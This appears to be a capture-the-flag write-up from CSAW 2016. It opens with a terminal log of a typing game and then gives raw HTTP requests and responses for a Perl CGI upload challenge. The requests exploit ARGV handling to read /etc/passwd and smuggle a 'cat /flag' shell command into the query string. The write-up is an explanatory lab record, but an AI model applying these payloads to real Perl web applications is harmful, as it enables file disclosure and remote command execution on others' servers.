        ZOMGZOMGOZMGZOMGZOMGOZMGZOMGZOMGOZMGZOMGZOMGOZMG
        ZOMGZOMG                                ZOMGZOMG
        ZOMGZOMG     TAP TAP REVOLUTION!!!!!!!  ZOMGZOMG
        ZOMGZOMG                                ZOMGZOMG
        ZOMGZOMGOZMGZOMGZOMGOZMGZOMGZOMGOZMGZOMGZOMGOZMG


                      R U READDY?!


The game is starting in...
Get ready to play
Get ready to play
Get ready to play
Get ready to play
Get ready to play
Get ready to play
Get ready to play
Get ready to play
Get ready to play
Get ready to play
ZOMGZOMGOZMGZOMGZOMGOZMGZOMGZOMGOZMGZOMGZOMGOZMG

When you see an 's', press the space bar

ZOMGZOMGOZMGZOMGZOMGOZMGZOMGZOMGOZMGZOMGZOMGOZMG
Get ready to play
Get ready to play
Get ready to play
Get ready to play
Get ready to play
Get ready to play
Get ready to play
Get ready to play
Get ready to play
Get ready to play
..........s
ZOMGZOMGOZMGZOMGZOMGOZMGZOMGZOMGOZMGZOMGZOMGOZMG

When you see an 'x', press the 'x' key

ZOMGZOMGOZMGZOMGZOMGOZMGZOMGZOMGOZMGZOMGZOMGOZMG
Get ready to play
Get ready to play
Get ready to play
Get ready to play
Get ready to play
Get ready to play
Get ready to play
Get ready to play
Get ready to play
Get ready to play
........x
ZOMGZOMGOZMGZOMGZOMGOZMGZOMGZOMGOZMGZOMGZOMGOZMG

When you see an 'm', press the 'm' key

ZOMGZOMGOZMGZOMGZOMGOZMGZOMGZOMGOZMGZOMGZOMGOZMG
Get ready to play
Get ready to play
Get ready to play
Get ready to play
Get ready to play
Get ready to play
Get ready to play
Get ready to play
Get ready to play
Get ready to play
.....m
TRAINING COMPLETE!




















Now you know everything you need to know....


for the rest of your life!




















LETS PLAY !




















Get ready to play
Get ready to play
Get ready to play
Get ready to play
Get ready to play
Get ready to play
Get ready to play
Get ready to play
Get ready to play
Get ready to play
.....s
..x
.m
ooooh, you fancy!!!
.....m
..x
.s
key is not (NIIICE JOB)!!!!




















TURBO TIME!

key is  (no5c30416d6cf52638460377995c6a8cf5)
```

# I Got Id (web / 200)

Regular request:

```
POST /cgi-bin/file.pl HTTP/1.1
Host: web.chal.csaw.io:8002
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Referer: http://web.chal.csaw.io:8002/cgi-bin/file.pl
Cookie: __cfduid=d6ef413399798aba40580af74aa4ed9001474100452
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=---------------------------1308552532609826431173673727
Content-Length: 340

-----------------------------1308552532609826431173673727
Content-Disposition: form-data; name="file"; filename="test.txt"
Content-Type: text/plain

abcd

-----------------------------1308552532609826431173673727
Content-Disposition: form-data; name="Submit!"

Submit!
-----------------------------1308552532609826431173673727--
```

```
HTTP/1.1 200 OK
Server: nginx/1.10.0 (Ubuntu)
Date: Sat, 17 Sep 2016 09:58:10 GMT
Content-Type: text/html; charset=ISO-8859-1
Content-Length: 560
Connection: close
Vary: Accept-Encoding

<!DOCTYPE html
    PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
    "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"
>
<html xmlns="http://www.w3.org/1999/xhtml" lang="en-US" xml:lang="en-US">
    <head>
        <title>Perl File Upload</title>
        <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
    </head>
    <body>
        <h1>Perl File Upload</h1>
        <form method="post" enctype="multipart/form-data">
            File: <input type="file" name="file" />
            <input type="submit" name="Submit!" value="Submit!" />
        </form>
        <hr />
abcd<br /></body></html>
```

Sending `file` parameter twice to obtain LFI:

```
POST /cgi-bin/file.pl?/etc/passwd HTTP/1.1
Host: web.chal.csaw.io:8002
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Referer: http://web.chal.csaw.io:8002/cgi-bin/file.pl
Cookie: __cfduid=d6ef413399798aba40580af74aa4ed9001474100452
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=---------------------------1308552532609826431173673727
Content-Length: 476

-----------------------------1308552532609826431173673727
Content-Disposition: form-data; name="file"
Content-Type: text/plain

ARGV
-----------------------------1308552532609826431173673727
Content-Disposition: form-data; name="file"; filename="test.txt"
Content-Type: text/plain

abcd
-----------------------------1308552532609826431173673727
Content-Disposition: form-data; name="Submit!"

Submit!
-----------------------------1308552532609826431173673727--
```

```
HTTP/1.1 200 OK
Server: nginx/1.10.0 (Ubuntu)
Date: Sat, 17 Sep 2016 10:04:42 GMT
Content-Type: text/html; charset=ISO-8859-1
Content-Length: 1927
Connection: close
Vary: Accept-Encoding

<!DOCTYPE html
    PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
    "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"
>
<html xmlns="http://www.w3.org/1999/xhtml" lang="en-US" xml:lang="en-US">
    <head>
        <title>Perl File Upload</title>
        <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
    </head>
    <body>
        <h1>Perl File Upload</h1>
        <form method="post" enctype="multipart/form-data">
            File: <input type="file" name="file" />
            <input type="submit" name="Submit!" value="Submit!" />
        </form>
        <hr />
root:x:0:0:root:/root:/bin/bash
<br />daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
<br />bin:x:2:2:bin:/bin:/usr/sbin/nologin
<br />sys:x:3:3:sys:/dev:/usr/sbin/nologin
<br />sync:x:4:65534:sync:/bin:/bin/sync
<br />games:x:5:60:games:/usr/games:/usr/sbin/nologin
<br />man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
<br />lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
<br />mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
<br />news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
<br />uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
<br />proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
<br />www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
<br />backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
<br />list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
<br />irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
<br />gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
<br />nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
<br />systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
<br />systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
<br />systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
<br />systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
<br />_apt:x:104:65534::/nonexistent:/bin/false
<br /></body></html>
```

Converting LFI to RCE:

```
POST /cgi-bin/file.pl?cat%20/flag%20%23| HTTP/1.1
Host: web.chal.csaw.io:8002
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
DNT: 1
Referer: http://web.chal.csaw.io:8002/cgi-bin/file.pl
Cookie: __cfduid=d6ef413399798aba40580af74aa4ed9001474100452
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=---------------------------1308552532609826431173673727
Content-Length: 476

-----------------------------1308552532609826431173673727
Content-Disposition: form-data; name="file"
Content-Type: text/plain

ARGV
-----------------------------1308552532609826431173673727
Content-Disposition: form-data; name="file"; filename="test.txt"
Content-Type: text/plain

abcd
-----------------------------1308552532609826431173673727
Content-Disposition: form-data; name="Submit!"

Submit!
-----------------------------1308552532609826431173673727--
```

```
HTTP/1.1 200 OK
Server: nginx/1.10.0 (Ubuntu)
Date: Sat, 17 Sep 2016 10:05:32 GMT
Content-Type: text/html; charset=ISO-8859-1
Content-Length: 587
Connection: close
Vary: Accept-Encoding

<!DOCTYPE html
    PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
    "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd"
>
<html xmlns="http://www.w3.org/1999/xhtml" lang="en-US" xml:lang="en-US">
    <head>
        <title>Perl File Upload</title>
        <meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1" />
    </head>
    <body>
        <h1>Perl File Upload</h1>
        <form method="post" enctype="multipart/form-data">
            File: <input type="file" name="file" />
            <input type="submit" name="Submit!" value="Submit!" />
        </form>
        <hr />
FLAG{p3rl_6_iz_EVEN_BETTER!!1}
<br /></body></html>
```

References:

[The Perl Jam 2: The Camel Strikes Back 32c3](https://www.youtube.com/watch?v=eH_u3C2WwQ0)

[https://gist.github.com/kentfredric/8f6ed343f4a16a34b08a](https://gist.github.com/kentfredric/8f6ed343f4a16a34b08a)